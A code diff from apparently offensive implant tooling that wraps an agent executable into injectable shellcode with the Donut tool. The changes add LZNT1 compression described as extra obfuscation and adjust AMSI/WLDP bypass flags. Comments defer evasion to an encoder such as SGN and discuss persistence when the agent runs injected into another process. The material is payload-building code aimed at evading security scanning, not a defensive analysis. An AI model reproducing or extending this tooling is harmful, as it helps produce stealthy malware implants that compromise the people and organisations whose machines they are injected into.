@@ -199,8 +199,15 @@ export async function ensureDonut(
  * Flags used:
  *   -f 1   raw shellcode output (no base64/C/etc wrapping)
  *   -a 1|2 architecture (1=x86, 2=x64)
- *   -b 2   bypass AMSI + WLDP by returning failure (abort) — avoids detection
- *   -x 1   exit by thread exit, not process exit — prevents crashing the host
+ *   -z 3   compress the embedded PE with LZNT1 — smaller payload + extra obfuscation
+ *          NOTE: LZNT1 / Xpress / Xpress-Huffman compression uses Windows
+ *          RtlCompressBuffer APIs, so it ONLY works when Donut runs on a
+ *          Windows host. On Linux/macOS Donut, only -z 1 (none) and -z 2
+ *          (aPLib) are supported and -z 3 will fail at compression time.
+ *   -b 1   no AMSI/WLDP bypass — caller is responsible for evasion (e.g. SGN)
+ *
+ * Exit behavior defaults to "exit thread" (-x 1) when -x is omitted, which is
+ * what we want — prevents crashing the host process when the agent terminates.
  *
  * NOTE — persistence in shellcode mode:
  *   When the agent runs as shellcode injected into another process, os.Executable()
@@ -235,7 +242,7 @@ export async function runDonut(
 
   try {
     // -i flag required since donut v1 (previously positional arg)
-    const result = await $`${bin} -f 1 -a ${archFlag} -b 3 -x 1 -o ${outputBin} -i ${inputPe}`
+    const result = await $`${bin} -a ${archFlag} -z 3 -f 1 -b 1 -o ${outputBin} -i ${inputPe}`
       .nothrow()
       .quiet();
     const stdout = result.stdout.toString().trim();
